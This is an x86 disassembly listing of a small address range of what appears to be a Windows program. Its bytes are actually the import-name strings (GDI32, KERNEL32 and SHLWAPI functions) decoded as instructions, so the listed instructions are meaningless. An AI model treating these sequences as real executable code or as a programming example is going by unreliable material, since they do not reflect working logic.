  41427e:	add    BYTE PTR [eax],al
  414280:	lods   al,BYTE PTR ds:[esi]
  414281:	add    BYTE PTR [ebx+0x72],al
  414284:	gs popa 
  414286:	je     0x4142ed
  414288:	push   edx
  414289:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41428e:	outs   dx,BYTE PTR ds:[esi]
  41428f:	dec    ecx
  414290:	outs   dx,BYTE PTR ds:[esi]
  414291:	imul   esi,DWORD PTR fs:[edx+0x65],0x89007463
  414299:	add    BYTE PTR [ebx+0x72],al
  41429c:	gs popa 
  41429e:	je     0x414305
  4142a0:	inc    edx
  4142a1:	jb     0x414318
  4142a3:	jae    0x41430d
  4142a5:	dec    ecx
  4142a6:	outs   dx,BYTE PTR ds:[esi]
  4142a7:	imul   esi,DWORD PTR fs:[edx+0x65],0xb7007463
  4142af:	add    DWORD PTR [eax+0x74],edx
  4142b2:	push   esi
  4142b3:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  4142ba:	iret   
  4142bb:	add    DWORD PTR [ebx+0x65],edx
  4142be:	ins    BYTE PTR es:[edi],dx
  4142bf:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4142c4:	ins    BYTE PTR es:[edi],dx
  4142c5:	gs je  0x41433c
  4142c8:	add    BYTE PTR gs:[ebx+0x65724300],dl
  4142cf:	popa   
  4142d0:	je     0x414337
  4142d2:	inc    esp
  4142d3:	dec    ecx
  4142d4:	inc    edx
  4142d5:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xc4000070
  4142dd:	add    DWORD PTR [edx+0x65],edx
  4142e0:	jae    0x41434b
  4142e2:	jp     0x414349
  4142e4:	push   eax
  4142e5:	popa   
  4142e6:	ins    BYTE PTR es:[edi],dx
  4142e7:	gs je  0x41435e
  4142ea:	add    BYTE PTR gs:[ebp+0x766f4d01],bl
  4142f1:	gs push esp
  4142f3:	outs   dx,DWORD PTR ds:[esi]
  4142f4:	inc    ebp
  4142f5:	js     0x4142f7
  4142f7:	add    BYTE PTR [edx+0x65724300],bl
  4142fd:	popa   
  4142fe:	je     0x414365
  414300:	inc    esi
  414301:	outs   dx,DWORD PTR ds:[esi]
  414302:	outs   dx,BYTE PTR ds:[esi]
  414303:	je     0x41434e
  414305:	outs   dx,BYTE PTR ds:[esi]
  414306:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41430e:	mov    esp,0x6c6c4500
  414313:	imul   esi,DWORD PTR [eax+0x73],0xb30065
  41431a:	inc    esp
  41431b:	gs ins BYTE PTR es:[edi],dx
  41431d:	gs je  0x414385
  414320:	inc    esp
  414321:	inc    ebx
  414322:	add    BYTE PTR [eax],al
  414324:	aad    0x0
  414326:	inc    ebp
  414327:	js     0x41439d
  414329:	push   esp
  41432a:	gs js  0x4143a1
  41432d:	dec    edi
  41432e:	jne    0x4143a4
  414330:	push   edi
  414331:	add    BYTE PTR [edi+0x65724300],al
  414337:	popa   
  414338:	je     0x41439f
  41433a:	inc    edx
  41433b:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xba000070
  414343:	add    DWORD PTR [edx+0x65],edx
  414346:	arpl   WORD PTR [esi+edx*2+0x69],si
  41434a:	jae    0x4143b5
  41434c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  414350:	int    0x0
  414352:	inc    ebp
  414353:	jae    0x4143b8
  414355:	popa   
  414356:	jo     0x4143bd
  414358:	add    BYTE PTR [eax],al
  41435a:	fadd   QWORD PTR [ecx]
  41435c:	push   ebx
  41435d:	gs je  0x4143a4
  414360:	dec    ecx
  414361:	inc    edx
  414362:	inc    ebx
  414363:	outs   dx,DWORD PTR ds:[esi]
  414364:	ins    BYTE PTR es:[edi],dx
  414365:	outs   dx,DWORD PTR ds:[esi]
  414366:	jb     0x4143bc
  414368:	popa   
  414369:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41436d:	add    BYTE PTR [ecx+0x66664f01],ah
  414373:	jae    0x4143da
  414375:	je     0x4143cd
  414377:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41437e:	dec    edi
  41437f:	jb     0x4143e8
  414381:	inc    ebp
  414382:	js     0x414384
  414384:	and    DWORD PTR [ecx],eax
  414386:	inc    edi
  414387:	gs je  0x4143cc
  41438a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  414392:	jae    0x414394
  414394:	mov    dh,0x0
  414396:	inc    esp
  414397:	gs ins BYTE PTR es:[edi],dx
  414399:	gs je  0x414401
  41439c:	dec    edi
  41439d:	bound  ebp,QWORD PTR [edx+0x65]
  4143a0:	arpl   WORD PTR [eax+eax*1+0x0],si
  4143a4:	mov    al,ds:0x65724300
  4143a9:	popa   
  4143aa:	je     0x414411
  4143ac:	dec    eax
  4143ad:	popa   
  4143ae:	je     0x414413
  4143b0:	push   0x73757242
  4143b5:	push   0xaa0000
  4143ba:	inc    ebx
  4143bb:	jb     0x414422
  4143bd:	popa   
  4143be:	je     0x414425
  4143c0:	push   eax
  4143c1:	outs   dx,DWORD PTR ds:[esi]
  4143c2:	ins    BYTE PTR es:[edi],dx
  4143c3:	jns    0x41442c
  4143c5:	outs   dx,DWORD PTR ds:[esi]
  4143c6:	outs   dx,BYTE PTR ds:[esi]
  4143c7:	push   edx
  4143c8:	outs   dx,BYTE PTR ds:[si]
  4143ca:	add    BYTE PTR [eax],al
  4143cc:	add    DWORD PTR [eax],0x626d6f43
  4143d2:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  4143d9:	add    dl,dl
  4143db:	add    DWORD PTR [ebx+0x65],edx
  4143de:	je     0x414422
  4143e0:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4143e8:	jae    0x4143ea
  4143ea:	lods   al,BYTE PTR ds:[esi]
  4143eb:	add    DWORD PTR [eax+0x6f],edx
  4143ee:	ins    BYTE PTR es:[edi],dx
  4143ef:	jns    0x414433
  4143f1:	gs jp  0x41445d
  4143f4:	gs jb  0x4143f7
  4143f7:	add    al,dl
  4143f9:	add    DWORD PTR [ebx+0x65],edx
  4143fc:	je     0x41443f
  4143fe:	bound  ebp,QWORD PTR [edi+0x72]
  414401:	je     0x414453
  414403:	jb     0x414474
  414405:	arpl   WORD PTR [eax],ax
  414407:	add    BYTE PTR [eax+0x66664f01],ah
  41440d:	jae    0x414474
  41440f:	je     0x414463
  414411:	outs   dx,BYTE PTR ds:[si]
  414413:	add    BYTE PTR [edx+eax*1],dl
  414416:	push   edi
  414417:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41441f:	add    BYTE PTR [eax+0x65724300],dh
  414425:	popa   
  414426:	je     0x41448d
  414428:	push   ebx
  414429:	outs   dx,DWORD PTR ds:[esi]
  41442a:	ins    BYTE PTR es:[edi],dx
  41442b:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  414433:	add    BYTE PTR [edx+0x74654701],cl
  414439:	push   esp
  41443a:	gs js  0x4144b1
  41443d:	dec    ebp
  41443e:	gs je  0x4144b3
  414441:	imul   esp,DWORD PTR [ebx+0x73],0x16c0041
  414448:	inc    edi
  414449:	gs je  0x41449c
  41444c:	popa   
  41444d:	ins    BYTE PTR es:[edi],dx
  41444e:	gs je  0x4144c5
  414451:	gs inc ebp
  414453:	outs   dx,BYTE PTR ds:[esi]
  414454:	je     0x4144c8
  414456:	imul   esp,DWORD PTR [ebp+0x73],0x4300a200
  41445d:	jb     0x4144c4
  41445f:	popa   
  414460:	je     0x4144c7
  414462:	dec    ecx
  414463:	inc    ebx
  414464:	push   edi
  414465:	add    ah,cl
  414467:	add    DWORD PTR [ebx+0x65],edx
  41446a:	ins    BYTE PTR es:[edi],dx
  41446b:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  414470:	imul   esi,DWORD PTR [eax+0x52],0xd3006e67
  414477:	add    DWORD PTR [ebx+0x65],edx
  41447a:	je     0x4144be
  41447c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  414484:	outs   dx,BYTE PTR gs:[esi]
  414486:	jae    0x4144f1
  414488:	outs   dx,DWORD PTR ds:[esi]
  414489:	outs   dx,BYTE PTR ds:[esi]
  41448a:	inc    ebp
  41448b:	js     0x41448d
  41448d:	add    bh,dl
  41448f:	add    DWORD PTR [ebx+0x65],edx
  414492:	je     0x4144d6
  414494:	jb     0x41450b
  414496:	jae    0x414500
  414498:	dec    edi
  414499:	jb     0x414502
  41449b:	inc    ebp
  41449c:	js     0x41449e
  41449e:	into   
  41449f:	add    DWORD PTR [ebx+0x65],edx
  4144a2:	ins    BYTE PTR es:[edi],dx
  4144a3:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  4144a8:	push   0x65
  4144aa:	arpl   WORD PTR [eax+eax*1+0x0],si
  4144ae:	add    DWORD PTR [ecx],0x47
  4144b1:	gs je  0x414508
  4144b4:	gs js  0x41452b
  4144b7:	inc    ebp
  4144b8:	js     0x41452e
  4144ba:	outs   dx,BYTE PTR gs:[esi]
  4144bc:	je     0x41450e
  4144be:	outs   dx,DWORD PTR ds:[esi]
  4144bf:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4144c6:	xlat   BYTE PTR ds:[ebx]
  4144c7:	add    BYTE PTR [esi+0x69],al
  4144ca:	ins    BYTE PTR es:[edi],dx
  4144cb:	ins    BYTE PTR es:[edi],dx
  4144cc:	push   edx
  4144cd:	outs   dx,BYTE PTR ds:[si]
  4144cf:	add    BYTE PTR [esi+0x65724300],dl
  4144d5:	popa   
  4144d6:	je     0x41453d
  4144d8:	inc    ebp
  4144d9:	ins    BYTE PTR es:[edi],dx
  4144da:	ins    BYTE PTR es:[edi],dx
  4144db:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4144e2:	outs   dx,BYTE PTR ds:[esi]
  4144e3:	dec    ecx
  4144e4:	outs   dx,BYTE PTR ds:[esi]
  4144e5:	imul   esi,DWORD PTR fs:[edx+0x65],0x6e007463
  4144ed:	add    DWORD PTR [edi+0x65],eax
  4144f0:	je     0x414542
  4144f2:	imul   edi,DWORD PTR [eax+0x65],0x7700006c
  4144f9:	add    DWORD PTR [edi+0x65],eax
  4144fc:	je     0x414551
  4144fe:	je     0x41456f
  414500:	arpl   WORD PTR [ebx+0x4f],bp
  414503:	bound  ebp,QWORD PTR [edx+0x65]
  414506:	arpl   WORD PTR [eax+eax*1+0x0],si
  41450a:	cmp    al,BYTE PTR [ecx]
  41450c:	inc    edi
  41450d:	gs je  0x414553
  414510:	jne    0x414584
  414512:	jb     0x414579
  414514:	outs   dx,BYTE PTR ds:[esi]
  414515:	je     0x414566
  414517:	bound  ebp,QWORD PTR [edx+0x65]
  41451a:	arpl   WORD PTR [eax+eax*1+0x0],si
  41451e:	jno    0x414521
  414520:	inc    edi
  414521:	gs je  0x414576
  414524:	dec    edi
  414525:	push   eax
  414526:	xor    al,BYTE PTR [eax]
  414528:	stos   DWORD PTR es:[edi],eax
  414529:	add    BYTE PTR [ebx+0x72],al
  41452c:	gs popa 
  41452e:	je     0x414595
  414530:	push   edx
  414531:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  414536:	outs   dx,BYTE PTR ds:[esi]
  414537:	add    BYTE PTR [edx+eax*1],al
  41453a:	push   ebx
  41453b:	je     0x41459e
  41453d:	jb     0x4145b3
  41453f:	inc    esp
  414540:	outs   dx,DWORD PTR ds:[esi]
  414541:	arpl   WORD PTR [edi+0x0],dx
  414544:	jbe    0x414546
  414546:	inc    edx
  414547:	imul   esi,DWORD PTR [edx+eax*2+0x6c],0x75000074
  41454f:	add    BYTE PTR [edx+0x65],al
  414552:	imul   ebp,DWORD PTR [bp+0x50],0x687461
  41455a:	mov    eax,0x61655201
  41455f:	ins    BYTE PTR es:[edi],dx
  414560:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  414567:	je     0x4145dd
  414569:	add    BYTE PTR gs:[eax],al
  41456c:	inc    edi
  41456d:	inc    esp
  41456e:	dec    ecx
  41456f:	xor    esi,DWORD PTR [edx]
  414571:	cs fs ins BYTE PTR es:[edi],dx
  414574:	ins    BYTE PTR es:[edi],dx
  414575:	add    BYTE PTR [eax+0x1],ah
  414578:	inc    esi
  414579:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  414580:	je     0x4145c8
  414582:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x3040000
  41458a:	dec    esp
  41458b:	gs popa 
  41458d:	jbe    0x4145f4
  41458f:	inc    ebx
  414590:	jb     0x4145fb
  414592:	je     0x4145fd
  414594:	arpl   WORD PTR [ecx+0x6c],sp
  414597:	push   ebx
  414598:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41459d:	outs   dx,BYTE PTR ds:[esi]
  41459e:	add    BYTE PTR [eax],al
  4145a0:	add    eax,DWORD PTR [ecx]
  4145a2:	inc    esp
  4145a3:	gs ins BYTE PTR es:[edi],dx
  4145a5:	gs je  0x41460d
  4145a8:	inc    esi
  4145a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x4902b900
  4145b1:	outs   dx,BYTE PTR ds:[esi]
  4145b2:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  4145ba:	inc    ebx
  4145bb:	jb     0x414626
  4145bd:	je     0x414628
  4145bf:	arpl   WORD PTR [ecx+0x6c],sp
  4145c2:	push   ebx
  4145c3:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4145c8:	outs   dx,BYTE PTR ds:[esi]
  4145c9:	add    BYTE PTR [edx+0x6c614300],ah
  4145cf:	ins    BYTE PTR es:[edi],dx
  4145d0:	dec    esi
  4145d1:	popa   
  4145d2:	ins    DWORD PTR es:[edi],dx
  4145d3:	gs fs push eax
  4145d6:	imul   esi,DWORD PTR [eax+0x65],0x12000057
  4145dd:	add    al,0x53
  4145df:	gs je  0x414627
  4145e2:	jb     0x414656
  4145e4:	outs   dx,DWORD PTR ds:[esi]
  4145e5:	jb     0x414634
  4145e7:	outs   dx,DWORD PTR ds:[esi]
  4145e8:	fs add BYTE PTR gs:[eax],al
  4145ec:	pop    edi
  4145ed:	add    al,BYTE PTR [edi+0x65]
  4145f0:	je     0x414646
  4145f2:	gs ins DWORD PTR es:[edi],dx
  4145f4:	jo     0x41463c
  4145f6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  4145fe:	add    BYTE PTR [eax],al
  414600:	cmc    
  414601:	add    BYTE PTR [ebx+0x72],al
  414604:	gs popa 
  414606:	je     0x41466d
  414608:	push   edi
  414609:	popa   
  41460a:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  414612:	ins    DWORD PTR es:[edi],dx
  414613:	gs jb  0x41466d
  414616:	add    BYTE PTR [eax],al
  414618:	pop    ebp
  414619:	add    DWORD PTR [esi+0x69],eax
  41461c:	outs   dx,BYTE PTR ds:[esi]
  41461d:	fs inc esi
  41461f:	imul   esi,DWORD PTR [edx+0x73],0x6c694674
  414626:	gs inc ecx
  414628:	add    BYTE PTR [eax],al
  41462a:	test   al,0x2
  41462c:	dec    eax
  41462d:	gs popa 
  41462f:	jo     0x41467d
  414631:	outs   dx,DWORD PTR ds:[esi]
  414632:	arpl   WORD PTR [ebx+0x0],bp
  414635:	add    BYTE PTR [ebx+eax*1+0x6f6d6552],dh
  41463c:	jbe    0x4146a3
  41463e:	inc    esp
  41463f:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414646:	jns    0x41469f
  414648:	add    BYTE PTR [eax],al
  41464a:	rol    BYTE PTR [eax],cl
  41464c:	inc    ebx
  41464d:	jb     0x4146b4
  41464f:	popa   
  414650:	je     0x4146b7
  414652:	inc    esi
  414653:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41465b:	outs   dx,BYTE PTR ds:[esi]
  41465c:	addr16 push edi
  41465e:	add    BYTE PTR [eax],al
  414660:	adc    al,0x3
  414662:	dec    esp
  414663:	outs   dx,DWORD PTR ds:[esi]
  414664:	arpl   WORD PTR [ecx+0x6c],sp
  414667:	push   ebx
  414668:	imul   edi,DWORD PTR [edx+0x65],0x47024200
  41466f:	gs je  0x4146c5
  414672:	push   0x5074726f
  414677:	popa   
  414678:	je     0x4146e2
  41467a:	dec    esi
  41467b:	popa   
  41467c:	ins    DWORD PTR es:[edi],dx
  41467d:	gs inc ecx
  41467f:	add    BYTE PTR ds:0x74654702,cl
  414685:	dec    ebp
  414686:	outs   dx,DWORD PTR ds:[esi]
  414687:	fs jne 0x4146f6
  41468a:	gs dec eax
  41468c:	popa   
  41468d:	outs   dx,BYTE PTR ds:[esi]
  41468e:	fs ins BYTE PTR es:[edi],dx
  414690:	gs push edi
  414692:	add    BYTE PTR [eax],al
  414694:	mov    ds:0x69725704,eax
  414699:	je     0x414700
  41469b:	inc    esi
  41469c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x6c470298
  4146a4:	outs   dx,DWORD PTR ds:[esi]
  4146a5:	bound  esp,QWORD PTR [ecx+0x6c]
  4146a8:	push   ebx
  4146a9:	imul   edi,DWORD PTR [edx+0x65],0xea0000
  4146b0:	inc    ebx
  4146b1:	jb     0x414718
  4146b3:	popa   
  4146b4:	je     0x41471b
  4146b6:	push   ebx
  4146b7:	gs ins DWORD PTR es:[edi],dx
  4146b9:	popa   
  4146ba:	jo     0x414724
  4146bc:	outs   dx,DWORD PTR ds:[esi]
  4146bd:	jb     0x414724
  4146bf:	push   edi
  4146c0:	add    BYTE PTR [eax],al
  4146c2:	jmp    0x4146c5
  4146c4:	inc    edi
  4146c5:	gs je  0x41470e
  4146c8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4146d0:	bound  esi,QWORD PTR [ebp+0x74]
  4146d3:	gs jae 0x41471b
  4146d6:	js     0x41472f
  4146d8:	add    BYTE PTR [eax],al
  4146da:	mov    ebx,0x73655203
  4146df:	gs je  0x414727
  4146e2:	jbe    0x414749
  4146e4:	outs   dx,BYTE PTR ds:[esi]
  4146e5:	je     0x4146e7
  4146e7:	add    BYTE PTR [esi+0x4],cl
  4146ea:	push   ebx
  4146eb:	ins    BYTE PTR es:[edi],dx
  4146ec:	gs gs jo 0x414735
  4146f0:	js     0x4146f2
  4146f2:	int3   
  4146f3:	add    al,0x6c
  4146f5:	jae    0x41476b
  4146f7:	jb     0x41475c
  4146f9:	jo     0x414774
  4146fb:	outs   dx,BYTE PTR ds:[esi]
  4146fc:	push   edi
  4146fd:	add    dl,cl
  4146ff:	add    BYTE PTR [ebx+0x72],al
  414702:	gs popa 
  414704:	je     0x41476b
  414706:	inc    ebp
  414707:	jbe    0x41476e
  414709:	outs   dx,BYTE PTR ds:[esi]
  41470a:	je     0x41474d
  41470c:	add    BYTE PTR [eax],al
  41470e:	push   eax
  41470f:	add    al,BYTE PTR [edi+0x65]
  414712:	je     0x414767
  414714:	jns    0x414789
  414716:	je     0x41477d
  414718:	ins    DWORD PTR es:[edi],dx
  414719:	inc    esp
  41471a:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414721:	jns    0x41477a
  414723:	add    BYTE PTR [edx+0x4],bh
  414726:	push   esi
  414727:	gs jb  0x41477d
  41472a:	gs je  0x414770
  41472d:	outs   dx,DWORD PTR ds:[esi]
  41472e:	outs   dx,BYTE PTR ds:[esi]
  41472f:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  414738:	imul   eax,DWORD PTR [eax],0x7
  41473b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41473f:	fs dec esp
  414741:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  414748:	js     0x4147a1
  41474a:	add    BYTE PTR [eax],al
  41474c:	pop    edi
  41474d:	add    al,0x54
  41474f:	ins    BYTE PTR es:[edi],dx
  414750:	jae    0x414799
  414752:	gs je  0x4147ab
  414755:	popa   
  414756:	ins    BYTE PTR es:[edi],dx
  414757:	jne    0x4147be
  414759:	add    bl,cl
  41475b:	add    cl,BYTE PTR [ecx+0x73]
  41475e:	inc    edx
  41475f:	popa   
  414760:	fs push edx
  414762:	gs popa 
  414764:	fs push eax
  414766:	je     0x4147da
  414768:	add    BYTE PTR [eax],al
  41476a:	inc    ebx
  41476b:	add    al,BYTE PTR [edi+0x65]
  41476e:	je     0x4147c3
  414770:	push   0x5074726f
  414775:	popa   
  414776:	je     0x4147e0
  414778:	dec    esi
  414779:	popa   
  41477a:	ins    DWORD PTR es:[edi],dx
  41477b:	gs push edi
  41477d:	add    BYTE PTR [edx+eax*1+0x47],dh
  414781:	gs je  0x4147d9
  414784:	jae    0x4147eb
  414786:	jb     0x4147cc
  414788:	gs popaw 
  41478b:	jne    0x4147f9
  41478d:	je     0x4147db
  41478f:	popa   
  414790:	outs   dx,BYTE PTR ds:[esi]
  414791:	addr16 dec ecx
  414793:	inc    esp
  414794:	add    BYTE PTR [eax],al
  414796:	adc    DWORD PTR [ebx],eax
  414798:	dec    esp
  414799:	outs   dx,DWORD PTR ds:[esi]
  41479a:	arpl   WORD PTR [ecx+0x6c],sp
  41479d:	dec    esp
  41479e:	outs   dx,DWORD PTR ds:[esi]
  41479f:	arpl   WORD PTR [ebx+0x0],bp
  4147a2:	mov    ecx,0x6e6f4300
  4147a7:	jbe    0x41480e
  4147a9:	jb     0x41481f
  4147ab:	inc    esp
  4147ac:	gs popaw 
  4147af:	jne    0x41481d
  4147b1:	je     0x4147ff
  4147b3:	outs   dx,DWORD PTR ds:[esi]
  4147b4:	arpl   WORD PTR [ecx+0x6c],sp
  4147b7:	add    BYTE PTR gs:[eax],al
  4147ba:	inc    BYTE PTR [ecx]
  4147bc:	inc    edi
  4147bd:	gs je  0x41480c
  4147c0:	outs   dx,DWORD PTR ds:[esi]
  4147c1:	arpl   WORD PTR [ecx+0x6c],sp
  4147c4:	gs dec ecx
  4147c6:	outs   dx,BYTE PTR ds:[esi]
  4147c7:	outs   dx,WORD PTR ds:[esi]
  4147c9:	inc    ecx
  4147ca:	add    BYTE PTR [eax],al
  4147cc:	loopne 0x4147ce
  4147ce:	inc    ebx
  4147cf:	jb     0x414836
  4147d1:	popa   
  4147d2:	je     0x414839
  4147d4:	dec    ebp
  4147d5:	jne    0x41484b
  4147d7:	gs js  0x414831
  4147da:	add    BYTE PTR [eax],al
  4147dc:	adc    eax,0x74655304
  4147e1:	inc    esi
  4147e2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x54736970
  4147ea:	outs   dx,DWORD PTR ds:[esi]
  4147eb:	dec    edi
  4147ec:	inc    ebp
  4147ed:	dec    ebp
  4147ee:	add    BYTE PTR [eax],al
  4147f0:	xor    DWORD PTR [ecx],eax
  4147f2:	inc    ebp
  4147f3:	jae    0x414858
  4147f5:	popa   
  4147f6:	jo     0x41485d
  4147f8:	inc    ebx
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	ins    DWORD PTR es:[edi],dx
  4147fb:	ins    DWORD PTR es:[edi],dx
  4147fc:	inc    esi
  4147fd:	jne    0x41486d
  4147ff:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  414803:	outs   dx,BYTE PTR ds:[esi]
  414804:	add    BYTE PTR [eax],al
  414806:	ss add al,0x53
  414809:	gs je  0x414860
  41480c:	push   0x64616572
  414811:	inc    ebx
  414812:	outs   dx,DWORD PTR ds:[esi]
  414813:	outs   dx,BYTE PTR ds:[esi]
  414814:	je     0x41487b
  414816:	js     0x41488c
  414818:	add    BYTE PTR [eax],al
  41481a:	sub    eax,DWORD PTR [ebx]
  41481c:	dec    ebp
  41481d:	outs   dx,DWORD PTR ds:[esi]
  41481e:	jbe    0x414885
  414820:	inc    esi
  414821:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x67004178
  414829:	add    al,BYTE PTR [edi+0x65]
  41482c:	je     0x414882
  41482e:	push   0x64616572
  414833:	dec    esp
  414834:	outs   dx,DWORD PTR ds:[esi]
  414835:	arpl   WORD PTR [ecx+0x6c],sp
  414838:	add    BYTE PTR gs:[ebp+0x4],ch
  41483c:	push   ebp
  41483d:	outs   dx,BYTE PTR ds:[esi]
  41483e:	ins    BYTE PTR es:[edi],dx
  41483f:	outs   dx,DWORD PTR ds:[esi]
  414840:	arpl   WORD PTR [ebx+0x46],bp
  414843:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x41007d00
  41484b:	fs fs inc ecx
  41484e:	je     0x4148bf
  414850:	ins    DWORD PTR es:[edi],dx
  414851:	push   edi
  414852:	add    BYTE PTR [eax],al
  414854:	push   ebp
  414855:	add    al,BYTE PTR [edi+0x65]
  414858:	je     0x4148ad
  41485a:	jns    0x4148cf
  41485c:	je     0x4148c3
  41485e:	ins    DWORD PTR es:[edi],dx
  41485f:	push   esp
  414860:	imul   ebp,DWORD PTR [ebp+0x65],0x756a6441
  414867:	jae    0x4148dd
  414869:	ins    DWORD PTR es:[edi],dx
  41486a:	outs   dx,BYTE PTR gs:[esi]
  41486c:	je     0x41486e
  41486e:	mov    WORD PTR [edi+edx*2],es
  414871:	popa   
  414872:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41487a:	je     0x4148e5
  41487c:	jo     0x4148ea
  41487e:	gs dec edi
  414880:	bound  ebp,QWORD PTR [edx+0x65]
  414883:	arpl   WORD PTR [ebx+esi*2+0x0],si
  414887:	add    BYTE PTR [ecx+0x2],ah
  41488a:	inc    edi
  41488b:	gs je  0x4148e2
  41488e:	gs ins DWORD PTR es:[edi],dx
  414890:	jo     0x4148e2
  414892:	popa   
  414893:	je     0x4148fd
  414895:	inc    ecx
  414896:	add    BYTE PTR [eax],al
  414898:	out    dx,al
  414899:	add    DWORD PTR [edi+0x65],eax
  41489c:	je     0x4148e4
  41489e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x657a69
  4148a6:	mov    BYTE PTR [esp+ebp*2],0x73
  4148aa:	je     0x41491e
  4148ac:	arpl   WORD PTR [ebp+0x70],bp
  4148af:	imul   edx,DWORD PTR [edi+0x0],0x6c470290
  4148b6:	outs   dx,DWORD PTR ds:[esi]
  4148b7:	bound  esp,QWORD PTR [ecx+0x6c]
  4148ba:	inc    esi
  4148bb:	jb     0x414922
  4148bd:	add    BYTE PTR gs:[eax],al
  4148c0:	rol    DWORD PTR [eax],1
  4148c2:	inc    ebx
  4148c3:	jb     0x41492a
  4148c5:	popa   
  4148c6:	je     0x41492d
  4148c8:	inc    esi
  4148c9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4148d1:	outs   dx,BYTE PTR ds:[esi]
  4148d2:	addr16 inc ecx
  4148d4:	add    BYTE PTR [eax],al
  4148d6:	cmp    al,BYTE PTR [ebx]
  4148d8:	dec    edi
  4148d9:	jo     0x414940
  4148db:	outs   dx,BYTE PTR ds:[esi]
  4148dc:	inc    esi
  4148dd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x52454b00
  4148e5:	dec    esi
  4148e6:	inc    ebp
  4148e7:	dec    esp
  4148e8:	xor    esi,DWORD PTR [edx]
  4148ea:	cs fs ins BYTE PTR es:[edi],dx
  4148ed:	ins    BYTE PTR es:[edi],dx
  4148ee:	add    BYTE PTR [eax],al
  4148f0:	push   ss
  4148f1:	add    BYTE PTR [eax+0x72],dl
  4148f4:	imul   ebp,DWORD PTR [esi+0x74],0x45676c44
  4148fb:	js     0x414954
  4148fd:	add    BYTE PTR [ebx],dl
  4148ff:	add    BYTE PTR [eax+0x61],dl
  414902:	addr16 gs push ebx
  414905:	gs je  0x41497d
  414908:	jo     0x41494e
  41490a:	ins    BYTE PTR es:[edi],dx
  41490b:	addr16 push edi
  41490d:	add    BYTE PTR [edx],al
  41490f:	add    BYTE PTR [ebx+0x68],al
  414912:	outs   dx,DWORD PTR ds:[esi]
  414913:	outs   dx,DWORD PTR ds:[esi]
  414914:	jae    0x41497b
  414916:	inc    ebx
  414917:	outs   dx,DWORD PTR ds:[esi]
  414918:	ins    BYTE PTR es:[edi],dx
  414919:	outs   dx,DWORD PTR ds:[esi]
  41491a:	jb     0x414973
  41491c:	add    BYTE PTR [eax],al
  41491e:	or     al,0x0
  414920:	inc    edi
  414921:	gs je  0x41496a
  414924:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656c7469
  41492c:	push   edi
  41492d:	add    BYTE PTR [edi],cl
  41492f:	add    BYTE PTR [edi+0x65],al
  414932:	je     0x414987
  414934:	popa   
  414935:	jbe    0x41499c
  414937:	inc    esi
  414938:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  414940:	add    BYTE PTR [eax],al
  414942:	arpl   WORD PTR [edi+0x6d],bp
  414945:	fs ins BYTE PTR es:[edi],dx
  414947:	xor    esi,DWORD PTR [bp+si]
  41494a:	cs fs ins BYTE PTR es:[edi],dx
  41494d:	ins    BYTE PTR es:[edi],dx
  41494e:	add    BYTE PTR [eax],al
  414950:	inc    esp
  414951:	add    BYTE PTR [eax+0x61],dl
  414954:	je     0x4149be
  414956:	inc    esi
  414957:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  41495f:	jae    0x4149a2
  414961:	add    BYTE PTR [ebx+0x48],dl
  414964:	dec    esp
  414965:	push   edi
  414966:	inc    ecx
  414967:	push   eax
  414968:	dec    ecx
  414969:	cs fs ins BYTE PTR es:[edi],dx
  41496c:	ins    BYTE PTR es:[edi],dx
  41496d:	add    BYTE PTR [ebx+0x70],dh
  414970:	push   ecx
  414971:	dec    edx
  414972:	push   0x47
  414974:	jne    0x4149bc
  414976:	mov    dl,0x4d
  414978:	inc    ecx
  414979:	add    BYTE PTR [edx-0x41ffbeb3],bh
  41497f:	dec    ebx
  414980:	inc    ecx
